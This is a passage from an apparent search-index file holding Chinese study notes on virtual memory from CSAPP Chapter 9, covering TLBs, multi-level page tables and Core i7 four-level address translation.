\u200b\u4ea7\u751f\u200b\u4e00\u4e2a\u200b\u865a\u62df\u5730\u5740\u200b, MMU \u200b\u5c31\u200b\u5fc5\u987b\u200b\u67e5\u9605\u200b\u4e00\u4e2a\u200b PTE, \u200b\u4ee5\u4fbf\u200b\u5c06\u200b\u865a\u62df\u5730\u5740\u200b\u7ffb\u8bd1\u200b\u4e3a\u200b\u7269\u7406\u5730\u5740\u200b. \u200b\u5728\u200b\u6700\u200b\u7cdf\u7cd5\u200b\u7684\u200b\u60c5\u51b5\u200b\u4e0b\u200b, \u200b\u8fd9\u200b\u8981\u6c42\u200b\u4ece\u200b\u5185\u5b58\u200b\u53d6\u200b\u4e00\u6b21\u200b\u6570\u636e\u200b, \u200b\u4ee3\u4ef7\u200b\u662f\u200b\u51e0\u5341\u200b\u5230\u200b\u51e0\u767e\u200b\u5468\u671f\u200b. \u200b\u5982\u679c\u200b PTE \u200b\u78b0\u5de7\u200b\u7f13\u5b58\u200b\u5728\u200b L1 \u200b\u4e2d\u200b, \u200b\u5f00\u9500\u200b\u5c31\u200b\u4e0b\u964d\u200b\u5230\u200b 1 \u200b\u5230\u200b 2 \u200b\u4e2a\u200b\u5468\u671f\u200b. \u200b\u7136\u800c\u200b, \u200b\u8bb8\u591a\u200b\u7cfb\u7edf\u200b\u90fd\u200b\u8bd5\u56fe\u200b\u6d88\u9664\u200b\u5373\u4f7f\u200b\u662f\u200b\u8fd9\u6837\u200b\u7684\u200b\u5f00\u9500\u200b, \u200b\u5b83\u4eec\u200b\u5728\u200b MMU \u200b\u4e2d\u200b\u5305\u62ec\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u5173\u4e8e\u200b PTE \u200b\u7684\u200b\u5c0f\u200b\u7f13\u5b58\u200b, \u200b\u79f0\u4e3a\u200b\u7ffb\u8bd1\u200b\u540e\u5907\u200b\u7f13\u51b2\u5668\u200b (Translation Lookaside Buffer, TLB)</p> <p>TLB \u200b\u662f\u200b\u4e00\u4e2a\u200b\u5c0f\u200b\u7684\u200b, \u200b\u865a\u62df\u200b\u5bfb\u5740\u200b\u7684\u200b\u7f13\u5b58\u200b, \u200b\u6bcf\u200b\u4e00\u884c\u200b\u90fd\u200b\u4fdd\u5b58\u200b\u7740\u200b\u4e00\u4e2a\u200b\u7531\u200b\u5355\u4e2a\u200b PTE \u200b\u7ec4\u6210\u200b\u7684\u200b\u5757\u200b. TLB \u200b\u901a\u5e38\u200b\u6709\u200b\u9ad8\u5ea6\u200b\u7684\u200b\u76f8\u8054\u200b\u5ea6\u200b. \u200b\u7528\u4e8e\u200b\u7ec4\u200b\u9009\u62e9\u200b\u548c\u884c\u200b\u5339\u914d\u200b\u7684\u200b\u7d22\u5f15\u200b\u662f\u4ece\u200b\u865a\u62df\u5730\u5740\u200b\u4e2d\u200b\u7684\u200b\u865a\u62df\u200b\u9875\u200b\u53f7\u200b\u4e2d\u200b\u63d0\u53d6\u200b\u51fa\u6765\u200b\u7684\u200b. \u200b\u5982\u679c\u200b TLB \u200b\u6709\u200b \\(T=2^t\\) \u200b\u4e2a\u7ec4\u200b, \u200b\u90a3\u4e48\u200b TLB \u200b\u7d22\u5f15\u200b (TLBI) \u200b\u662f\u200b\u7531\u200b VPN \u200b\u7684\u200b \\(t\\) \u200b\u4e2a\u200b\u6700\u4f4e\u200b\u4f4d\u200b\u7ec4\u6210\u200b\u7684\u200b, TLB \u200b\u6807\u8bb0\u200b (TLBT) \u200b\u662f\u200b\u7531\u200b VPN \u200b\u4e2d\u200b\u5269\u4f59\u200b\u7684\u200b\u4f4d\u200b\u7ec4\u6210\u200b\u7684\u200b.</p> <p>\u200b\u4e0b\u56fe\u200b\u5c55\u793a\u200b\u4e86\u200b TLB \u200b\u547d\u4e2d\u200b\u65f6\u6240\u200b\u5305\u62ec\u200b\u7684\u200b\u6b65\u9aa4\u200b, \u200b\u5173\u952e\u70b9\u200b\u662f\u200b, \u200b\u6240\u6709\u200b\u7684\u200b\u5730\u5740\u200b\u7ffb\u8bd1\u200b\u6b65\u9aa4\u200b\u90fd\u200b\u662f\u200b\u5728\u200b\u82af\u7247\u200b\u4e0a\u200b\u7684\u200b MMU \u200b\u4e2d\u200b\u6267\u884c\u200b\u7684\u200b, \u200b\u56e0\u6b64\u200b\u975e\u5e38\u200b\u5feb\u200b.</p> <ul> <li> <ol> <li>CPU \u200b\u4ea7\u751f\u200b\u865a\u62df\u5730\u5740\u200b</li> </ol> </li> <li>2,3. MMU \u200b\u4ece\u200b TLB \u200b\u4e2d\u200b\u53d6\u51fa\u200b\u76f8\u5e94\u200b\u7684\u200b PTE</li> <li> <ol> <li>MMU \u200b\u5c06\u200b\u865a\u62df\u5730\u5740\u200b\u7ffb\u8bd1\u6210\u200b\u7269\u7406\u5730\u5740\u200b, \u200b\u5e76\u200b\u5c06\u200b\u5b83\u200b\u53d1\u9001\u5230\u200b\u9ad8\u901f\u7f13\u5b58\u200b/\u200b\u4e3b\u5b58\u200b</li> </ol> </li> <li> <ol> <li>\u200b\u9ad8\u901f\u7f13\u5b58\u200b/\u200b\u4e3b\u5b58\u200b\u5c06\u200b\u6240\u200b\u8bf7\u6c42\u200b\u7684\u200b\u6570\u636e\u5b57\u200b\u8fd4\u56de\u200b\u7ed9\u200b CPU</li> </ol> </li> </ul> <p>\u200b\u5f53\u200b TLB \u200b\u4e0d\u200b\u547d\u4e2d\u200b\u65f6\u200b, \u200b\u65b0\u200b\u53d6\u51fa\u200b\u7684\u200b PTE \u200b\u5b58\u653e\u200b\u5728\u200b TLB \u200b\u4e2d\u200b, \u200b\u53ef\u80fd\u200b\u4f1a\u200b\u8986\u76d6\u200b\u4e00\u4e2a\u200b\u5df2\u6709\u200b\u6761\u76ee\u200b. </p> <p>Note</p> <p>TLB \u200b\u4e2d\u200b\u5b58\u653e\u200b\u7684\u200b\u603b\u662f\u200b\u6709\u6548\u200b\u4f4d\u4e3a\u200b 1 \u200b\u7684\u200b PTE.</p>"},{"location":"notes/ICS/Chapter%2009%20Virtual%20Memory/#963","title":"9.6.3 \u200b\u591a\u7ea7\u200b\u9875\u8868","text":"<p>\u200b\u524d\u9762\u200b\u63d0\u200b\u8fc7\u200b, \u200b\u7531\u4e8e\u200b\u5730\u5740\u200b\u7a7a\u95f4\u200b\u7684\u200b\u5730\u5740\u200b\u6570\u5f88\u591a\u200b, \u200b\u6211\u4eec\u200b\u9700\u8981\u200b\u7684\u200b\u9875\u8868\u200b\u7a7a\u95f4\u200b\u975e\u5e38\u200b\u5927\u200b (\u200b\u5728\u200b 32 \u200b\u4f4d\u200b\u5730\u5740\u200b\u7a7a\u95f4\u200b, 4KB \u200b\u9875\u9762\u200b\u548c\u200b\u4e00\u4e2a\u200b 4 \u200b\u5b57\u8282\u200b PTE, \u200b\u9700\u8981\u200b\u4e00\u4e2a\u200b 4MB \u200b\u7684\u200b\u9875\u8868\u200b\u9a7b\u7559\u200b\u5728\u200b\u5185\u5b58\u200b\u4e2d\u200b, \u200b\u5bf9\u200b 64 \u200b\u4f4d\u200b\u5730\u5740\u200b\u7a7a\u95f4\u200b\u5c06\u200b\u975e\u5e38\u200b\u5927\u200b)</p> <p>\u200b\u7528\u6765\u200b\u538b\u7f29\u200b\u9875\u8868\u200b\u7684\u200b\u5e38\u7528\u200b\u529e\u6cd5\u200b\u662f\u200b\u4f7f\u7528\u200b\u5c42\u6b21\u7ed3\u6784\u200b\u7684\u200b\u9875\u8868\u200b. \u200b\u4e0b\u9762\u200b\u7528\u200b\u4e00\u4e2a\u200b\u5177\u4f53\u200b\u7684\u200b\u4f8b\u5b50\u200b\u7406\u89e3\u200b\u8fd9\u4e2a\u200b\u601d\u60f3\u200b:</p> <p>\u200b\u5047\u8bbe\u200b 32 \u200b\u4f4d\u200b\u865a\u62df\u5730\u5740\u200b\u7a7a\u95f4\u200b\u88ab\u200b\u5206\u4e3a\u200b 4KB \u200b\u7684\u200b\u9875\u200b, \u200b\u800c\u200b\u6bcf\u4e2a\u200b PTE \u200b\u90fd\u200b\u662f\u200b 4 \u200b\u5b57\u8282\u200b. \u200b\u5047\u8bbe\u200b\u5728\u200b\u8fd9\u200b\u4e00\u200b\u65f6\u523b\u200b, \u200b\u865a\u62df\u5730\u5740\u200b\u7a7a\u95f4\u200b\u6709\u200b\u5982\u4e0b\u200b\u5f62\u5f0f\u200b: \u200b\u5185\u5b58\u200b\u7684\u200b\u524d\u200b 2K \u200b\u4e2a\u200b\u9875\u9762\u200b\u5206\u914d\u200b\u7ed9\u200b\u4e86\u200b\u4ee3\u7801\u200b\u548c\u200b\u6570\u636e\u200b, \u200b\u5269\u4e0b\u200b 6K \u200b\u4e2a\u200b\u9875\u9762\u200b\u8fd8\u200b\u672a\u200b\u5206\u914d\u200b, \u200b\u518d\u200b\u63a5\u4e0b\u6765\u200b\u7684\u200b 1023 \u200b\u4e2a\u200b\u9875\u9762\u200b\u4e5f\u200b\u672a\u200b\u5206\u914d\u200b, \u200b\u63a5\u4e0b\u6765\u200b\u7684\u200b 1 \u200b\u4e2a\u200b\u9875\u9762\u200b\u5206\u914d\u200b\u7ed9\u200b\u4e86\u200b\u7528\u6237\u200b\u6808\u200b. \u200b\u4e0b\u56fe\u200b\u5c55\u793a\u200b\u4e86\u200b\u6211\u4eec\u200b\u5982\u4f55\u200b\u4e3a\u200b\u8fd9\u4e2a\u200b\u865a\u62df\u5730\u5740\u200b\u7a7a\u95f4\u200b\u6784\u9020\u200b\u4e00\u4e2a\u200b\u4e24\u7ea7\u200b\u7684\u200b\u9875\u8868\u200b\u5c42\u6b21\u7ed3\u6784\u200b.</p> <p></p> <p>\u200b\u4e00\u7ea7\u200b\u9875\u8868\u200b\u4e2d\u200b\u7684\u200b\u6bcf\u4e2a\u200b PTE \u200b\u8d1f\u8d23\u200b\u6620\u5c04\u200b\u865a\u62df\u5730\u5740\u200b\u7a7a\u95f4\u200b\u4e2d\u200b\u4e00\u4e2a\u200b 4MB \u200b\u7684\u200b\u7247\u200b (chunk), \u200b\u8fd9\u91cc\u200b\u6bcf\u200b\u4e00\u7247\u200b\u90fd\u200b\u662f\u200b\u7531\u200b 1024 \u200b\u4e2a\u200b\u8fde\u7eed\u200b\u9875\u9762\u200b\u7ec4\u6210\u200b\u7684\u200b. \u200b\u4f8b\u5982\u200b PTE 0 \u200b\u6620\u5c04\u200b\u7b2c\u4e00\u7247\u200b. \u200b\u5047\u8bbe\u200b\u5730\u5740\u200b\u7a7a\u95f4\u200b\u662f\u200b 4GB, 1024 \u200b\u4e2a\u200b PTE \u200b\u5c31\u200b\u8db3\u4ee5\u200b\u8986\u76d6\u200b\u6574\u4e2a\u200b\u7a7a\u95f4\u200b\u4e86\u200b.</p> <p>\u200b\u5982\u679c\u200b\u7247\u200b i \u200b\u4e2d\u200b\u6bcf\u4e2a\u200b\u9875\u9762\u200b\u90fd\u200b\u672a\u200b\u5206\u914d\u200b, \u200b\u90a3\u4e48\u200b\u4e00\u7ea7\u200b PTEi \u200b\u5c31\u200b\u4e3a\u200b\u7a7a\u200b. \u200b\u4f8b\u5982\u200b\u7247\u200b 2-7 \u200b\u662f\u200b\u672a\u200b\u88ab\u200b\u5206\u914d\u200b\u7684\u200b. \u200b\u7136\u800c\u200b\u53ea\u8981\u200b\u5176\u4e2d\u200b\u6709\u200b\u4e00\u4e2a\u200b\u9875\u200b\u662f\u200b\u88ab\u200b\u5206\u914d\u200b\u7684\u200b, \u200b\u90a3\u4e48\u200b\u4e00\u7ea7\u200b  PTE i \u200b\u5c31\u200b\u6307\u5411\u200b\u4e00\u4e2a\u200b\u4e8c\u7ea7\u200b\u9875\u8868\u200b\u7684\u200b\u57fa\u5740\u200b. \u200b\u4e8c\u7ea7\u200b\u9875\u8868\u200b\u4e0e\u200b\u6211\u4eec\u200b\u4e4b\u524d\u200b\u770b\u5230\u200b\u7684\u200b\u9875\u8868\u200b\u4e00\u6837\u200b, \u200b\u6bcf\u4e2a\u200b PTE \u200b\u8d1f\u8d23\u200b\u6620\u5c04\u200b\u4e00\u4e2a\u200b 4KB \u200b\u7684\u200b\u865a\u62df\u5185\u5b58\u200b\u9875\u9762\u200b.</p> <p>\u200b\u8fd9\u79cd\u200b\u65b9\u6cd5\u200b\u4ece\u200b\u4e24\u4e2a\u200b\u65b9\u9762\u200b\u51cf\u5c11\u200b\u4e86\u200b\u5185\u5b58\u200b\u8981\u6c42\u200b\u3002\u200b\u7b2c\u4e00\u200b\uff0c\u200b\u5982\u679c\u200b\u4e00\u7ea7\u200b\u9875\u8868\u200b\u4e2d\u200b\u7684\u200b\u4e00\u4e2a\u200bPTE\u200b\u662f\u200b\u7a7a\u200b\u7684\u200b\uff0c\u200b\u90a3\u4e48\u200b\u76f8\u5e94\u200b\u7684\u200b\u4e8c\u7ea7\u200b\u9875\u8868\u200b\u5c31\u200b\u6839\u672c\u200b\u4e0d\u4f1a\u200b\u5b58\u5728\u200b\u3002\u200b\u8fd9\u200b\u4ee3\u8868\u200b\u7740\u200b\u4e00\u79cd\u200b\u5de8\u5927\u200b\u7684\u200b\u6f5c\u5728\u200b\u8282\u7ea6\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u5bf9\u4e8e\u200b\u4e00\u4e2a\u200b\u5178\u578b\u200b\u7684\u200b\u7a0b\u5e8f\u200b\uff0c4GB\u200b\u7684\u200b\u865a\u62df\u5730\u5740\u200b\u7a7a\u95f4\u200b\u7684\u200b\u5927\u90e8\u5206\u200b\u90fd\u200b\u4f1a\u200b\u662f\u200b\u672a\u200b\u5206\u914d\u200b\u7684\u200b\u3002\u200b\u7b2c\u4e8c\u200b\uff0c\u200b\u53ea\u6709\u200b\u4e00\u7ea7\u200b\u9875\u8868\u200b\u624d\u200b\u9700\u8981\u200b\u603b\u662f\u200b\u5728\u200b\u4e3b\u5b58\u200b\u4e2d\u200b;\u200b\u865a\u62df\u5185\u5b58\u200b\u7cfb\u7edf\u200b\u53ef\u4ee5\u200b\u5728\u200b\u9700\u8981\u200b\u65f6\u200b\u521b\u5efa\u200b\u3001\u200b\u9875\u9762\u200b\u8c03\u5165\u200b\u6216\u200b\u8c03\u51fa\u200b\u4e8c\u7ea7\u200b\u9875\u8868\u200b\uff0c\u200b\u8fd9\u200b\u5c31\u200b\u51cf\u5c11\u200b\u4e86\u200b\u4e3b\u5b58\u200b\u7684\u200b\u538b\u529b\u200b;\u200b\u53ea\u6709\u200b\u6700\u200b\u7ecf\u5e38\u200b\u4f7f\u7528\u200b\u7684\u200b\u4e8c\u7ea7\u200b\u9875\u8868\u200b\u624d\u200b\u9700\u8981\u200b\u7f13\u5b58\u200b\u5728\u200b\u4e3b\u5b58\u200b\u4e2d\u200b\u3002</p> <p>\u200b\u7c7b\u4f3c\u200b\u5730\u200b, \u200b\u8fd8\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b k \u200b\u7ea7\u200b\u9875\u8868\u200b. \u200b\u56fe\u200b9-18\u200b\u63cf\u8ff0\u200b\u4e86\u200b\u4f7f\u7528\u200b k \u200b\u7ea7\u200b\u9875\u8868\u200b\u5c42\u6b21\u7ed3\u6784\u200b\u7684\u200b\u5730\u5740\u200b\u7ffb\u8bd1\u200b\u3002\u200b\u865a\u62df\u5730\u5740\u200b\u88ab\u200b\u5212\u5206\u200b\u6210\u4e3a\u200b k \u200b\u4e2a\u200bVPN \u200b\u548c\u200b 1 \u200b\u4e2a\u200bVPO\u3002\u200b\u6bcf\u4e2a\u200b VPNi \u200b\u90fd\u200b\u662f\u200b\u4e00\u4e2a\u200b\u5230\u200b\u7b2c\u200bi\u200b\u7ea7\u200b\u9875\u8868\u200b\u7684\u200b\u7d22\u5f15\u200b\uff0c\u200b\u5176\u4e2d\u200b 1&lt;i&lt;k\u3002\u200b\u7b2c\u200b j \u200b\u7ea7\u200b\u9875\u8868\u200b\u4e2d\u200b\u7684\u200b\u6bcf\u4e2a\u200bPTE\uff0c1\u2264i&lt;k-1\uff0c\u200b\u90fd\u200b\u6307\u5411\u200b\u7b2c\u200b i+1 \u200b\u7ea7\u200b\u7684\u200b\u67d0\u4e2a\u200b\u9875\u8868\u200b\u7684\u200b\u57fa\u5740\u200b\u3002\u200b\u7b2c\u200b k \u200b\u7ea7\u200b\u9875\u8868\u200b\u4e2d\u200b\u7684\u200b\u6bcf\u4e2a\u200b PTE \u200b\u5305\u542b\u200b\u67d0\u4e2a\u200b\u7269\u7406\u200b\u9875\u9762\u200b\u7684\u200bPPN\uff0c\u200b\u6216\u8005\u200b\u4e00\u4e2a\u200b\u78c1\u76d8\u200b\u5757\u200b\u7684\u200b\u5730\u5740\u200b\u3002\u200b\u4e3a\u4e86\u200b\u6784\u9020\u200b\u7269\u7406\u5730\u5740\u200b\uff0c\u200b\u5728\u200b\u80fd\u591f\u200b\u786e\u5b9a\u200bPPN\u200b\u4e4b\u524d\u200b\uff0cMMU\u200b\u5fc5\u987b\u200b\u8bbf\u95ee\u200b k \u200b\u4e2a\u200bPTE\u3002</p> <p></p>"},{"location":"notes/ICS/Chapter%2009%20Virtual%20Memory/#97-intel-core-i7linux","title":"9.7 \u200b\u6848\u4f8b\u200b\u7814\u7a76\u200b: Intel Core i7/Linux \u200b\u5185\u5b58\u200b\u7cfb\u7edf","text":"<p>\u200b\u5730\u5740\u200b\u7a7a\u95f4\u200b:</p> <p>\u200b\u73b0\u5728\u200b\u7684\u200b Core i7 \u200b\u652f\u6301\u200b 48 \u200b\u4f4d\u200b (256TB) \u200b\u865a\u62df\u5730\u5740\u200b\u7a7a\u95f4\u200b\u548c\u200b 52 \u200b\u4f4d\u200b (4PB) \u200b\u7269\u7406\u5730\u5740\u200b\u7a7a\u95f4\u200b, \u200b\u8fd8\u6709\u200b\u4e00\u4e2a\u200b\u517c\u5bb9\u200b\u6a21\u5f0f\u200b, \u200b\u652f\u6301\u200b 32 \u200b\u4f4d\u200b (4GB) \u200b\u865a\u62df\u200b\u548c\u200b\u7269\u7406\u5730\u5740\u200b\u7a7a\u95f4\u200b.</p> <p>\u200b\u4e0b\u56fe\u200b\u7ed9\u51fa\u200b\u4e86\u200b Core i7 \u200b\u5185\u5b58\u200b\u7cfb\u7edf\u200b\u7684\u200b\u91cd\u8981\u200b\u90e8\u5206\u200b. \u200b\u5904\u7406\u5668\u200b\u5c01\u88c5\u200b\u5305\u62ec\u200b\u56db\u4e2a\u200b\u6838\u200b, \u200b\u4e00\u4e2a\u200b\u5927\u200b\u7684\u200b\u6240\u6709\u200b\u6838\u90fd\u200b\u5171\u4eab\u200b\u7684\u200b L3 cache, \u200b\u4e00\u4e2a\u200b DDR3 \u200b\u5185\u5b58\u200b\u63a7\u5236\u5668\u200b. \u200b\u6bcf\u4e2a\u200b\u6838\u200b\u5305\u542b\u200b\u4e00\u4e2a\u200b\u5c42\u6b21\u7ed3\u6784\u200b\u7684\u200b TLB, \u200b\u4e00\u4e2a\u200b\u5c42\u6b21\u7ed3\u6784\u200b\u7684\u200b\u6570\u636e\u200b\u548c\u200b\u6307\u4ee4\u200b Cache, \u200b\u4ee5\u53ca\u200b\u4e00\u7ec4\u200b\u5feb\u901f\u200b\u7684\u200b\u70b9\u5230\u70b9\u200b\u94fe\u8def\u200b. \u200b\u8fd9\u79cd\u200b\u94fe\u8def\u200b\u57fa\u4e8e\u200b QuickPath \u200b\u6280\u672f\u200b, \u200b\u662f\u200b\u4e3a\u4e86\u200b\u8ba9\u200b\u4e00\u4e2a\u200b\u6838\u200b\u4e0e\u200b\u5176\u4ed6\u200b\u6838\u200b\u548c\u200b\u5916\u90e8\u200b I/O \u200b\u6865\u200b\u76f4\u63a5\u200b\u901a\u4fe1\u200b. TLB \u200b\u662f\u200b\u865a\u62df\u200b\u5bfb\u5740\u200b\u7684\u200b, \u200b\u56db\u8def\u200b\u7ec4\u200b\u76f8\u8054\u200b\u7684\u200b. L1,L2,L3 Cache \u200b\u662f\u200b\u7269\u7406\u200b\u5bfb\u5740\u200b\u7684\u200b, \u200b\u5757\u200b\u5927\u5c0f\u200b\u4e3a\u200b 64\u200b\u5b57\u8282\u200b. \u200b\u5176\u4e2d\u200b L1, L2 8\u200b\u8def\u7ec4\u200b\u76f8\u8054\u200b, L3 16\u200b\u8def\u7ec4\u200b\u76f8\u8054\u200b. </p> <p></p>"},{"location":"notes/ICS/Chapter%2009%20Virtual%20Memory/#971-core-i7","title":"9.7.1 Core i7 \u200b\u5730\u5740\u200b\u7ffb\u8bd1","text":"<p>Core i7 \u200b\u91c7\u7528\u200b\u56db\u7ea7\u200b\u9875\u8868\u200b\u7ed3\u6784\u200b. \u200b\u6bcf\u4e2a\u200b\u8fdb\u7a0b\u200b\u6709\u200b\u5176\u200b\u79c1\u6709\u200b\u7684\u200b\u9875\u8868\u200b\u5c42\u6b21\u7ed3\u6784\u200b. \u200b\u5f53\u200b\u4e00\u4e2a\u200b Linux \u200b\u8fdb\u7a0b\u200b\u8fd0\u884c\u200b\u65f6\u200b, \u200b\u5141\u8bb8\u200b\u9875\u8868\u200b\u6362\u200b\u8fdb\u6362\u200b\u51fa\u200b, \u200b\u4f46\u662f\u200b\u4e0e\u200b\u5df2\u200b\u5206\u914d\u200b\u4e86\u200b\u7684\u200b\u9875\u200b\u76f8\u5173\u8054\u200b\u7684\u200b\u9875\u8868\u200b\u90fd\u200b\u662f\u200b\u9a7b\u7559\u200b\u5728\u200b\u5185\u5b58\u200b\u4e2d\u200b\u7684\u200b. CR3 \u200b\u63a7\u5236\u200b\u5bc4\u5b58\u5668\u200b\u6307\u5411\u200b\u7b2c\u4e00\u7ea7\u200b\u9875\u8868\u200b (L1) \u200b\u7684\u200b\u8d77\u59cb\u200b\u4f4d\u7f6e\u200b. CR3 \u200b\u7684\u200b\u503c\u200b\u662f\u200b\u8fdb\u7a0b\u200b\u4e0a\u4e0b\u6587\u200b\u7684\u200b\u4e00\u90e8\u5206\u200b, \u200b\u6bcf\u6b21\u200b\u4e0a\u4e0b\u6587\u200b\u5207\u6362\u200b\u65f6\u200b, CR3 \u200b\u7684\u200b\u503c\u200b\u90fd\u200b\u4f1a\u200b\u88ab\u200b\u6062\u590d\u200b.</p> <p></p> <p>\u200b\u4e0b\u56fe\u200b\u7ed9\u51fa\u200b\u4e86\u200b\u7b2c\u4e00\u4e8c\u200b\u4e09\u7ea7\u200b\u9875\u8868\u200b\u4e2d\u200b\u6761\u200b\u76ee\u7684\u200b\u683c\u5f0f\u200b. \u200b\u5f53\u200b \\(P=1\\) \u200b\u65f6\u200b, \u200b\u5730\u5740\u200b\u5b57\u200b\u6bb5\u200b\u5305\u542b\u200b\u4e00\u4e2a\u200b 40 \u200b\u4f4d\u200b==\u200b\u7269\u7406\u200b\u9875\u200b\u53f7\u200b==(\u200b\u5730\u5740\u200b\u8fd8\u8981\u200b\u8865\u200b12\u200b\u4f4d\u200b0), \u200b\u6307\u5411\u200b\u9002\u5f53\u200b\u7684\u200b\u9875\u8868\u200b(\u200b\u4e0b\u200b\u4e00\u7ea7\u200b\u9875\u8868\u200b)\u200b\u7684\u200b\u5f00\u59cb\u200b\u5904\u200b. \u200b\u6ce8\u610f\u200b, \u200b\u6211\u4eec\u200b\u8981\u6c42\u200b\u7269\u7406\u200b\u9875\u8868\u200b 4KB \u200b\u5bf9\u9f50\u200b. (\u200b\u7269\u7406\u5730\u5740\u200b\u7a7a\u95f4\u200b\u662f\u200b 52 \u200b\u4f4d\u200b, \u200b\u53bb\u6389\u200b 40 \u200b\u4f4d\u200b\u7269\u7406\u200b\u9875\u200b\u53f7\u200b\u8fd8\u200b\u5269\u4e0b\u200b 12 \u200b\u4f4d\u200b, \u200b\u56e0\u6b64\u200b\u6bcf\u4efd\u200b\u9875\u8868\u200b\u7684\u200b\u5927\u5c0f\u200b\u662f\u200b 4KB)</p> <p>XD=1 \u200b\u4ee3\u8868\u200b\u4e0d\u80fd\u200b\u4ece\u200b\u8fd9\u4e2a\u200b\u5b50\u9875\u200b\u4e2d\u200b\u53d6\u6307\u4ee4\u200b, XD=0 \u200b\u4ee3\u8868\u200b\u53ef\u4ee5\u200b\u4ece\u200b\u8fd9\u4e2a\u200b\u5b50\u9875\u200b\u4e2d\u200b\u53d6\u6307\u4ee4\u200b </p> <p>\u200b\u56db\u7ea7\u200b\u9875\u8868\u200b\u4e5f\u200b\u662f\u200b\u7c7b\u4f3c\u200b\u7684\u200b. </p> <p>\u200b\u5f53\u200b MMU \u200b\u7ffb\u8bd1\u200b\u6bcf\u200b\u4e00\u4e2a\u200b\u865a\u62df\u5730\u5740\u200b\u65f6\u200b, \u200b\u5b83\u200b\u8fd8\u200b\u4f1a\u200b\u66f4\u65b0\u200b\u53e6\u5916\u200b\u4e24\u4e2a\u200b\u5185\u6838\u200b\u7f3a\u9875\u200b\u5904\u7406\u7a0b\u5e8f\u200b\u4f1a\u200b\u7528\u5230\u200b\u7684\u200b\u4f4d\u200b. \u200b\u6bcf\u6b21\u200b\u8bbf\u95ee\u200b\u4e00\u4e2a\u200b\u9875\u200b\u65f6\u200b, MMU \u200b\u90fd\u200b\u4f1a\u200b\u8bbe\u7f6e\u200b A \u200b\u4f4d\u200b, \u200b\u79f0\u4e3a\u200b\u5f15\u7528\u200b\u4f4d\u200b, \u200b\u5185\u6838\u200b\u53ef\u4ee5\u200b\u7528\u200b\u5b83\u200b\u5b9e\u73b0\u200b\u9875\u200b\u66ff\u6362\u7b97\u6cd5\u200b. \u200b\u6bcf\u6b21\u200b\u5bf9\u200b\u4e00\u4e2a\u200b\u9875\u200b\u8fdb\u884c\u200b\u4e86\u200b\u5199\u200b\u4e4b\u540e\u200b, MMU \u200b\u90fd\u200b\u4f1a\u200b\u8bbe\u7f6e\u200b D \u200b\u4f4d\u200b, \u200b\u53c8\u79f0\u200b\u4fee\u6539\u200b\u4f4d\u200b\u6216\u200b\u810f\u4f4d\u200b. \u200b\u4fee\u6539\u200b\u4f4d\u200b\u544a\u8bc9\u200b\u5185\u6838\u200b\u5728\u200b\u590d\u5236\u200b\u66ff\u6362\u200b\u9875\u200b\u4e4b\u524d\u200b\u662f\u5426\u200b\u5fc5\u987b\u200b\u5199\u56de\u200b\u727a\u7272\u200b\u9875\u200b.</p> <p>Core i7 \u200b\u4e2d\u200b\u591a\u7ea7\u200b\u9875\u8868\u200b\u7684\u200b\u7ec4\u7ec7\u200b\u5f62\u5f0f\u200b</p> <p>\u200b\u5728\u200b\u524d\u9762\u200b\u6211\u4eec\u200b\u63d0\u5230\u200b\u4e86\u200b\u591a\u7ea7\u200b\u9875\u8868\u200b, \u200b\u73b0\u5728\u200b\u6211\u4eec\u200b\u7528\u200b Core i7 \u200b\u5b9e\u4f8b\u200b\u6765\u200b\u770b\u770b\u200b\u600e\u4e48\u200b\u4f7f\u7528\u200b\u4e00\u4e2a\u200b\u591a\u7ea7\u200b\u9875\u8868\u200b.</p> <p>\u200b\u6b63\u5982\u200b\u524d\u9762\u200b\u6240\u8bf4\u200b, Core i7 \u200b\u4f7f\u7528\u200b 4 \u200b\u7ea7\u200b\u9875\u8868\u200b, \u200b\u5bf9\u4e8e\u200b\u4e00\u4e2a\u200b 48 \u200b\u4f4d\u200b\u7684\u200b\u865a\u62df\u5730\u5740\u200b, \u200b\u5b83\u200b\u7684\u200b\u6700\u540e\u200b 12 \u200b\u4f4d\u200b (2^12=4KB) \u200b\u4f5c\u4e3a\u200b\u6700\u540e\u200b\u4e00\u7ea7\u200b\u9875\u8868\u200b\u7684\u200b\u9875\u200b\u5185\u200b\u504f\u79fb\u91cf\u200b, \u200b\u524d\u9762\u200b\u7684\u200b 36 \u200b\u4f4d\u200b\u7b49\u200b\u5206\u4e3a\u200b 4 \u200b\u4e2a\u200b 9 \u200b\u4f4d\u200b\u7684\u200b VPNi \u200b\u4f5c\u4e3a\u200b\u8bbf\u95ee\u200b\u8f83\u9ad8\u7ea7\u200b\u9875\u8868\u200b\u7684\u200b\u7d22\u5f15\u200b. \u200b\u6ce8\u610f\u200b, \u200b\u9875\u8868\u200b\u4e2d\u200b\u6bcf\u4e2a\u200b\u6761\u200b\u76ee\u7684\u200b\u5927\u5c0f\u200b\u90fd\u200b\u662f\u200b 8byte, \u200b\u56e0\u6b64\u200b\u6bcf\u200b\u4e00\u7ea7\u200b\u9875\u8868\u200b\u4e00\u5171\u200b\u6709\u200b 4KB/8byte=512\u200b\u4e2a\u200b\u6761\u76ee\u200b, \u200b\u8fd9\u200b\u6b63\u597d\u200b\u53ef\u4ee5\u200b\u7528\u200b 9 \u200b\u4f4d\u200b\u4e8c\u8fdb\u5236\u200b\u6570\u6765\u200b\u7f16\u7801\u200b.</p> <p>\u200b\u56e0\u6b64\u200b, \u200b\u5047\u8bbe\u200b\u6211\u4eec\u200b\u6709\u200b\u4e00\u4e2a\u200b\u865a\u62df\u5730\u5740\u200b \\(va\\), \u200b\u67e5\u8be2\u200b\u9875\u8868\u200b\u7684\u200b\u8fc7\u7a0b\u200b\u662f\u200b, \u200b\u9996\u5148\u200b\u901a\u8fc7\u200b CR3 \u200b\u5bc4\u5b58\u5668\u200b\u7684\u200b\u5185\u5bb9\u200b\u5b9a\u4f4d\u200b\u5230\u200b\u7b2c\u4e00\u7ea7\u200b\u9875\u8868\u200b\u7684\u200b\u8d77\u59cb\u200b\u5730\u5740\u200b, \u200b\u7528\u200b \\(va[0:8]\\) \u200b\u4f5c\u4e3a\u200b\u7d22\u5f15\u200b\u627e\u5230\u200b\u4e00\u7ea7\u200b\u9875\u8868\u200b\u4e2d\u200b\u7684\u200b\u67d0\u4e2a\u200b\u6761\u76ee\u200b, 